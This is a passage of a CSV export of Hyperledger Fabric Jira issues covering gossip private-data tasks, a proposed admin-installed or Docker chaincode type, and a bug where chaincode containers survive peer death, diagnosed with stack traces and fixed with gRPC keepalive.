Implement channel custom peer filtering,FAB-6012,20578,20526,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,02/Sep/17 1:49 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:43 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"To support pull (and also push) and to be able to select a subset of peers from the channel, that are in the collection - we need to implement a method that takes a custom predicate over the SignedData of a peer, and uses it to filter the peers of the channel.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf3z:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
New Custom Chaincode Spec Type for Admin Installations,FAB-6014,20580,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sudeshrshetty,sudeshrshetty,sudeshrshetty,02/Sep/17 4:59 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,28/Oct/17 1:59 AM,,,,Abandoned,,,,,,,,0,,,,,,," 

CUSTOM, a new chaincode spec which cannot be packaged or installed remotely. And can only be installed manually by admin inside peer. 

Admin will package this chaincode spec by using own custom packager and will place the deployment spec directly in chaincode path inside peer in ‘<CHAINCODE NAME>.<VERSION>’ format.

Running ‘peer chaincode instantiate’ after that on peer will initialize the chaincode.

 peer chaincode instantiate -n example-custom-cc -v 0 -c '\{""Args"":[""a"",""10""]}' -C mychannel

 

Any attempt to install/package remotely will not produce deployment spec with code package and peer is always forced to check chaincode path for code package during instantiation. 

_+For Admins:+_ Code package inside deployment spec should be tar of files which will be placed directly inside chaincode container without any compilation or processing in between.

 

 

 ",,aleksandar.likic,greg.haskins,mastersingh24,sudeshrshetty,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf4f:",,,,,,,,,,,,,,,,,,,,,,,aleksandar.likic,greg.haskins,mastersingh24,sudeshrshetty,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Sep/17 8:02 AM;mastersingh24;[~sudeshrshetty] - What exactly is the point of this?  To have packages pre-installed on the peer's filesystem (i.e. they got there via some mechanism other than peer chaincode install or using the SDKs to call the install API)?;;;","05/Sep/17 11:50 PM;sudeshrshetty;Admin will generate chaincode deployment spec outside peer using any custom packager and will copy output package to chaincode path inside peer (for example: /var/hyperler/production/chaincode/).

When chaincode instantiation looks for package inside chaincode path, it will find it and will upload code package inside deployment spec directly into chaincode docker container without any compilation or any other manipulation.



dockerfile for custom chaincode will look like any other chaincode docker file lie below

{color:#205081}ADD binpackage.tar /usr/local/bin{color}

Where binpackage.tar is ** cds.CodePackage;;;","06/Sep/17 4:03 AM;greg.haskins;[~sudeshrshetty] This is really just the same proposal your team made for BINARY (which I already rejected), with the same problems, except now its even more awkward because you need an out-of-band installation.  I do understand what you are after.  While I still would prefer to see an $arch neutral solution, I also understand that your team wants to stick with golang.  What I would suggest is, fully commit to docker.  E.g., rather than trying to use golang static binaries and injecting them into a potentially heterogenous peer environment, recognize that docker was designed more or less to handle that heterogeneity (sans perhaps the $arch neutrality, though even that is improving).

Here's what I propose:

1) Come up with a formal design for the interface between peer and chaincode container w.r.t. docker launch.  E.g. right now we have a different launch spec for GOLANG vs CAR vs JAVA vs NODE.  Fix this so they are uniform.  For example, perhaps spec that each one should have its own CMD provided, and a set of environment variables and/or filepaths (e.g. /etc/hyperledger/fabric/peer/tls) for the knobs that the peer needs to pass.

2) Write a CR which implements (1) for the existing types

3) Write a CR that adds a new DOCKER type to the peer.   I am open to the notion that this could follow a ""download from a docker registry"" model, or an ""administrator must pre-install"" model.  

4) Write a CR that creates a method for generating client-side generation of the docker payload in a deterministic manner (e.g. similar to how [~troyronda] normalized a build based on golang v1.9 using docker)

(3) and (4) could be the same CR, if appropriate.

I would be supportive of considering such a proposal if you think this satisfies your goals.;;;","07/Sep/17 6:42 AM;aleksandar.likic;[~greg.haskins] Just to make sure I understand exactly what you are saying. Currently, a CC launch spec is really just a set of arguments and environment variables returned by 
func (chaincodeSupport *ChaincodeSupport) getArgsAndEnv(...) in chaincode_support.go. Depending on a CC type, this function will return different args and envs. You think this should be refactored by defining a formal launch spec interface and having implementations for each CC type. Then, introduce a new CC type called DOCKER, and provide implementation for all necessary interfaces - the launch spec being one of them. A client utility to generate artifacts required for the launch (e.g. a docker image with the CC binary baked in) is also required. Am I getting it right?;;;","07/Sep/17 6:58 AM;greg.haskins;[~aleksandar.likic] actually, nothing to do with the CC launch spec.  What I mean specifically is this code right here:

 

[https://github.com/hyperledger/fabric/blob/77cfd8c61f303538da986f93ac77203dac6a7df4/core/chaincode/chaincode_support.go#L406]

 

You can see for GOLANG/CAR, we launch chaincode by effectively doing ""docker run ... chaincode --peerAddress XXX""

For JAVA, we effectively are doing ""docker run java --jar chaincode.jar  ---peerAddress XXXX""

For NODE, "" ... /bin/sh -c node ...""

etc.

We get away with this because the peer essentially controls the entire docker build pipeline (currently).  Despite this, this has bothered me for a while and I've wanted to clean it up.  In theory, the containers could be built in such a way that we can have a uniform launch (e.g. ""docker run -ePEER_ADDRESS=XXX"") by normalizing the interface.  E.g. maybe the different chaincode environments (golang, java, node, whatever) are abstracted behind ENTRYPOINT/CMD such that peer need not care how the chaincode is launched, but rather just starting the container.  In addition, things like ""peer address"" parameters or TLS key material could be specified in general terms, such as expressed as environment variables and/for file paths.

Once this spec is established, we could then extricate the peer from the docker-build such that any container that adheres to the spec could be launched by the peer.  This would more or less be a prerequisite to accomplish what i am suggesting above.

The final piece of the puzzle would then be to create a new type (""DOCKER"") that basically says to the peer during instantiation ""don't try to docker-build this image, docker-pull it instead"".

Does this make sense?

 

 ;;;","07/Sep/17 8:41 AM;aleksandar.likic;OK, I understand. I see two independent stories, one to move the knowledge on how the CC is launched into container itself (so the peer can just start the container) and another one to introduce a new CC type, DOCKER. The latter can be done without the former. I agree it would be nice to clean the peer code from the CC type specifics as much as possible.;;;","07/Sep/17 8:59 AM;aleksandar.likic;On the second thought, we do need a generic way to start a CC process in a user-provided docker container, so why not do it for all other CC types as well. A little bit more work, but makes sense.;;;","07/Sep/17 9:42 PM;aleksandar.likic;[~greg.haskins] Thinking about the way to install/instantiate a CC of type DOCKER: obviously, the CDS (CC deployment spec) has to be extended with information on the target docker image. It should contain information on the target platform, perhaps using the same convention currently used by fabric peer when it calculates the base image name. A peer would be able to validate compatibility at CC install time. This would be applicable only to a DOCKER CC. Code_package in CDS would not be used for a DOCKER CC.

Thinking about a client utility to create a CC specific docker image, the easiest way seems to be just extending 'peer chaincode package' with an option to compile GOLANG source, build a new docker image, and stick the new image information into signed CDS. Essentially, compressing three steps that peer is normally performing for packaging, compilation and instantiation. Compatibility is guaranteed as it is done by fabric itself. Client is responsible to deploy CDS to peers that can handle it.

A more user friendly solution (the one that doesn't require creation of a user CC specific docker image and its out of band handling) is to extends current GOLANG CC type to handle pre-compiled GOLANG code. 'peer chaincode package' would accept an option that means 'pre-compile', first compile the CC, then calculate the base image name, and finally produce a CDS with the CC binary in code_package, and the proper docker base image name that guarantees compatibility. During instantiation the peer would skip CC compilation and calculation of proper image name (image compatibility is validated during CC install) and just create and start docker container as it is done today.

It is assumed that GOLANG compilation by the fabric ccbuild container is deterministic and that the base image name, that contains all peer metadata, assures that an auditor can use the same version of fabric used by the packager to reproduce the build from the same source. This might require sticking the source hash into signed CDS as well.

What do you think?;;;","19/Sep/17 12:29 AM;aleksandar.likic;Hi [~greg.haskins], here is a draft proposal based on your recommendations. Note that after some analysis we think that a docker-centric solution is actually a prerequisite for removing chaincode type specific code from the peer. Otherwise the objective is the same - to make the peer chaincode type agnostic.

[https://docs.google.com/document/d/1BLQ0PWKdtpQtIlKewRAkdhjSGkDPWXTXj12Oe1GBw6I/edit#heading=h.9pacqguezrqe]

Please comment, we would like to finalize the proposal and start implementation asap. Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
golang chaincode containers do not reliably exit if peer dies,FAB-6017,20583,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,muralisr,greg.haskins,greg.haskins,02/Sep/17 9:05 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,05/Oct/17 7:21 PM,v1.0.0,v1.0.1,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"Chaincode processes form a GRPC link to the peer.  I have noted that in v1.0.1, it is possible to kill the peer and the chaincode containers continue to run.  Expected behavior is that the shim detects GRPC has severed and terminates the process which in turn will terminate the container.",,AdnanChoudhury,greg.haskins,muralisr,wutongtree,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6333,FAB-4461,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf53:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,greg.haskins,muralisr,wutongtree,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Sep/17 12:23 AM;muralisr;[~greg.haskins] Killing the peer should tear the chat stream down and take down the grpc connection as well. I'll check to make sure if we are doing everything correctly on both sides of the connection.

Do you know in your scenario if there were multiple hops between chaincode and peer ?;;;","05/Sep/17 11:27 PM;muralisr;[~greg.haskins] tried a few variations of ""kill peer while chaincode is up"" with chaincode in various states such as waiting for requests, processing requests (tried long lived using Sleep).... in all cases chaincode got killed and container exited with message like
{code:java}
2017-09-05 13:51:08.859 UTC [shim] func1 -> ERRO 001 Received error from server: rpc error: code = Internal desc = transport is closing, ending chaincode stream{code}

The one way I can think of such a scenario is if an intermediate proxy or something keeps the chaincode side connection open (which is why I was asking about multiple hops). Thoughts please ?;;;","06/Sep/17 2:54 AM;greg.haskins;[~muralisr] context was running in Kubernetes (OpenShift Origin v3.6.0 to be exact).  While definitely funky networking takes place within k8s, I am not aware of any intermediate hops between endpoints.;;;","26/Sep/17 12:15 AM;muralisr;[~greg.haskins] when testing something else I believe I ran into this situation - the chaincode container was up but the peer had gone away. I was able to get the stack though FWIW


{code:java}
goroutine 0 [idle]:
runtime.futex(0x10350d0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffcd24f1ad8, 0x40fefb, ...)
        /opt/go/src/runtime/sys_linux_amd64.s:438 +0x21
runtime.futexsleep(0x10350d0, 0xc400000000, 0xffffffffffffffff)
        /opt/go/src/runtime/os_linux.go:45 +0x62
runtime.notesleep(0x10350d0)
        /opt/go/src/runtime/lock_futex.go:151 +0x9b
runtime.stopm()
        /opt/go/src/runtime/proc.go:1670 +0xe5
runtime.findrunnable(0xc420021900, 0x0)
        /opt/go/src/runtime/proc.go:2125 +0x4d2
runtime.schedule()
        /opt/go/src/runtime/proc.go:2245 +0x12c
runtime.park_m(0xc420068c00)
        /opt/go/src/runtime/proc.go:2308 +0xb6
runtime.mcall(0x7ffcd24f1c70)
        /opt/go/src/runtime/asm_amd64.s:286 +0x5b

goroutine 1 [chan receive]:
github.com/hyperledger/fabric/core/chaincode/shim.chatWithPeer(0xc420016017, 0x6, 0x7f28a2cf3068, 0xc420144880, 0xffe200, 0x105af38, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:334 +0x426
github.com/hyperledger/fabric/core/chaincode/shim.Start(0xffe200, 0x105af38, 0x89d1c4, 0xc420161f60)
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:145 +0x1a2
main.main()
        /chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:203 +0x41
goroutine 20 [IO wait]:
internal/poll.runtime_pollWait(0x7f28a35b8f70, 0x72, 0x0)
        /opt/go/src/runtime/netpoll.go:173 +0x57
internal/poll.(*pollDesc).wait(0xc4201a2a98, 0x72, 0xffffffffffffff00, 0xffc8c0, 0xff6dd0)
        /opt/go/src/internal/poll/fd_poll_runtime.go:85 +0xae
internal/poll.(*pollDesc).waitRead(0xc4201a2a98, 0xc420266000, 0x8000, 0x8000)
        /opt/go/src/internal/poll/fd_poll_runtime.go:90 +0x3d
internal/poll.(*FD).Read(0xc4201a2a80, 0xc420266000, 0x8000, 0x8000, 0x0, 0x0, 0x0)
        /opt/go/src/internal/poll/fd_unix.go:125 +0x18a
net.(*netFD).Read(0xc4201a2a80, 0xc420266000, 0x8000, 0x8000, 0x3, 0xc420021900, 0xc420021970)
        /opt/go/src/net/fd_unix.go:202 +0x52
net.(*conn).Read(0xc42014c160, 0xc420266000, 0x8000, 0x8000, 0x0, 0x0, 0x0)
        /opt/go/src/net/net.go:176 +0x6d
bufio.(*Reader).Read(0xc4201821e0, 0xc420276038, 0x9, 0x9, 0xc4202a8330, 0xc420038d48, 0x840d47)
        /opt/go/src/bufio/bufio.go:213 +0x30b
io.ReadAtLeast(0xff8ac0, 0xc4201821e0, 0xc420276038, 0x9, 0x9, 0x9, 0x0, 0x400eae, 0xc420038e5f)
        /opt/go/src/io/io.go:309 +0x86
io.ReadFull(0xff8ac0, 0xc4201821e0, 0xc420276038, 0x9, 0x9, 0x4ecb1a0501, 0xc50000000000004e, 0x4e)
        /opt/go/src/io/io.go:327 +0x58
github.com/hyperledger/fabric/vendor/golang.org/x/net/http2.readFrameHeader(0xc420276038, 0x9, 0x9, 0xff8ac0, 0xc4201821e0, 0x0, 0x0, 0xc4201b73b0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/golang.org/x/net/http2/frame.go:237 +0x7b
github.com/hyperledger/fabric/vendor/golang.org/x/net/http2.(*Framer).ReadFrame(0xc420276000, 0xffdb40, 0xc420188ea0, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/golang.org/x/net/http2/frame.go:492 +0xa4
github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*framer).readFrame(0xc420188e70, 0xc420188ea0, 0xc420188ea0, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http_util.go:608 +0x2f
github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).reader(0xc420068600)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1115 +0xc0
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:267 +0xbd8

goroutine 21 [select]:
github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).controller(0xc420068600)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1188 +0x142
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:297 +0xd0e

goroutine 22 [select]:
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).transportMonitor(0xc4202501c0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:995 +0x1de
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:716 +0x67a

goroutine 24 [select]:
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream.func3(0x1006320, 0xc420068600, 0xc420250000, 0xc4201922c0, 0xc420164700)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:255 +0x1cd
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:254 +0xe23
goroutine 25 [select]:
github.com/hyperledger/fabric/core/chaincode/shim.chatWithPeer.func1(0xc420186420, 0xc420144980, 0x7f28a2cf3068, 0xc420144880, 0xc420186480, 0xc420264150)
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:285 +0x207
created by github.com/hyperledger/fabric/core/chaincode/shim.chatWithPeer
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:267 +0x40f

goroutine 43 [select]:
github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*recvBufferReader).Read(0xc4201470c0, 0xc42014a890, 0x5, 0x5, 0x0, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/transport.go:145 +0x2ec
github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*transportReader).Read(0xc420189110, 0xc42014a890, 0x5, 0x5, 0x46ebde, 0xc4201647c0, 0xc4200580c0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/transport.go:349 +0x55
io.ReadAtLeast(0xffa140, 0xc420189110, 0xc42014a890, 0x5, 0x5, 0x5, 0xc420068600, 0xc420164700, 0x5)
        /opt/go/src/io/io.go:309 +0x86
io.ReadFull(0xffa140, 0xc420189110, 0xc42014a890, 0x5, 0x5, 0x17, 0x1db39, 0x1034580)
        /opt/go/src/io/io.go:327 +0x58
github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*Stream).Read(0xc420164700, 0xc42014a890, 0x5, 0x5, 0xa74da0, 0xc420195c20, 0xc420026dd8)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/transport.go:333 +0xbf
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*parser).recvMsg(0xc42014a880, 0x6400000, 0xc420021900, 0x0, 0xbe69bfa8ef99ba28, 0x9eb9dc9ab, 0x1034580, 0x1db39)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/rpc_util.go:265 +0x65
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.recv(0xc42014a880, 0x10030c0, 0x105af38, 0xc420164700, 0x0, 0x0, 0xa74da0, 0xc420195c70, 0x6400000, 0x0, ...)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/rpc_util.go:361 +0x4d
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*clientStream).RecvMsg(0xc4201922c0, 0xa74da0, 0xc420195c70, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:398 +0xe6
github.com/hyperledger/fabric/protos/peer.(*chaincodeSupportRegisterClient).Recv(0xc420144880, 0xc420264150, 0xc420195c20, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/protos/peer/chaincode_shim.pb.go:372 +0x62
github.com/hyperledger/fabric/core/chaincode/shim.chatWithPeer.func1.1(0xc420144980, 0x7f28a2cf3068, 0xc420144880, 0xc4201864e0)
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:281 +0x35
created by github.com/hyperledger/fabric/core/chaincode/shim.chatWithPeer.func1
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:279 +0xdd1

rax    0xca
rbx    0x1034fc0
rcx    0x459d63
rdx    0x0
rdi    0x10350d0
rsi    0x0
rbp    0x7ffcd24f1aa0
rsp    0x7ffcd24f1a58
r8     0x0
r9     0x0
r10    0x0
r11    0x286
r12    0x1
r13    0xc4201864e0
r14    0x1
r15    0x0
rip    0x459d61
rflags 0x286
cs     0x33
fs     0x0
gs     0x0

{code}


I'd have expected 


{code:java}
github.com/hyperledger/fabric/protos/peer.(*chaincodeSupportRegisterClient).Recv(0xc420144880, 0xc420264150, 0xc420195c20, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/protos/peer/chaincode_shim.pb.go:372 +0x62
github.com/hyperledger/fabric/core/chaincode/shim.chatWithPeer.func1.1(0xc420144980, 0x7f28a2cf3068, 0xc420144880, 0xc4201864e0)
        /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/shim/chaincode.go:281 +0x35

{code}

to exit

Will try to recreate now that I know it happens in my env too.;;;","02/Oct/17 9:30 AM;muralisr;[~greg.haskins] I can now reliably recreate this by doing
{noformat}
docker network disconnect <peers network ID> <peer container>
{noformat}
After that the chaincode sticks around even if the peer is killed. Turn grpc keepalive unblocks and triggers errors. Something like that maybe a good thing to do in general to take of network delinks. We can try and see if this works in your environment to quickly check feasibility.;;;","05/Oct/17 1:26 AM;muralisr;[~greg.haskins] when the chaincode-peer connection gets disconnected link level, bad things can happen on both sides. This is easily fixed by using gRPC keepalive support https://jira.hyperledger.org/browse/FAB-4305 (thanks [~mastersingh24] ). Will put out a CR for this ....

As an aside this should also help https://jira.hyperledger.org/browse/FAB-6333 [~AdnanChoudhury] .;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add signature and signed text to authentication in case no TLS is used,FAB-6018,20584,20526,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,03/Sep/17 2:33 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:42 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"The pull needs to be able to determine if a peer is eligible of receiving a private RW set of a certain collection by evaluating a policy.
The policy needs a signature and some signed message.

If TLS is used, the peer can use the Authentication info from the handshake, but if the peer doesn't use TLS - the authentication info isn't populated. ",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf5b:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create puller object,FAB-6019,20587,20526,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,03/Sep/17 6:16 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,07/Sep/17 4:14 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"In order to pull private data, we need to implement pull logic",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf5j:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add support for enabling/disabling experimental features in builds,FAB-6020,20590,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,03/Sep/17 10:14 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,30/Sep/17 7:01 PM,,,,v1.1.0,,fabric-build,fabric-orderer,fabric-peer,,,,0,release-planning-1.1,,,,,,"As the project attempts to move to a more consistent release schedule (current proposal is every 3 months), there will be features which will not be completed in a single release cycle.

It is not uncommon, however, for projects to provide builds with experimental features for those who wish to stay on the bleeding edge.  

There are a couple of ways to do this:

1) Use feature flags to enable/disable features at runtime
2) Use Go build tags to optionally compile with experimental features.",,mastersingh24,wutongtree,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6453,FAB-7746,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyf5r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,wutongtree,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
make docker-clean should not delete official release images,FAB-6021,20592,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sanchezl,mastersingh24,mastersingh24,04/Sep/17 8:19 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,22/May/18 9:20 PM,v1.0.2,,,v1.2.0,,fabric-build,,,,,,0,,,,,,,The docker-clean target currently deletes all images even if they are the official release versions.  It would be best if it only deleted the snapshot versions,,mastersingh24,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,900,900,,0%,900,900,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyf6n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jan/18 1:24 AM;sanchezl;I posted a patch set at [https://gerrit.hyperledger.org/r/c/17295/].

I need to think a bit more about what should happen when current build is a release build.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add collection to transient store,FAB-6022,20593,20526,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,04/Sep/17 8:39 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,19/Sep/17 11:07 PM,,,,WON'T FIX,,fabric-ledger,fabric-peer,,,,,0,,,,,,,"The transient store currently doesn't store private RWsets according to collections, but only according to transaction ID and endorser ID.

* The endorser ID should be changed to be the hash of the RWset
* We also need the collection to be specified",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf6v:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Should not retreive same key multiple times during couch bulk validation,FAB-6023,20594,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,denyeart,denyeart,04/Sep/17 9:17 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 5:29 AM,,,,,,,,,,,,0,,,,,,,"I tested create two marbles in one block - marble3 and marble4. 

During validation phase, bulk retrieve had the following keys:

Entering BatchRetrieveDocumentMetadata() keys=[lsccmarbles marblesmarble3 lsccmarbles marblesmarble4]

Note that lsccmarbles is listed twice.  The same key should not be duplicated in the bulk retrieve.  Better to use a map when building the bulk retrieve during validation to ensure that keys are only added once.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf73:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Sep/17 5:29 AM;denyeart;Will be done as part of FAB-6011.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric/examples/configtxupdate/reconfig_membership/ example does not work,FAB-6024,20596,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,,pvrbharg,pvrbharg,05/Sep/17 10:05 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Feb/18 12:28 AM,,,,v1.1.0,,fabric-samples,,,,,,0,Usability,,,,,,"[https://github.com/hyperledger/fabric/tree/release/examples/configtxupdate/reconfig_membership]

The above example did not work for me until Jason provided a work-around that worked for me.

Per Jason's guidance - here is what I did:

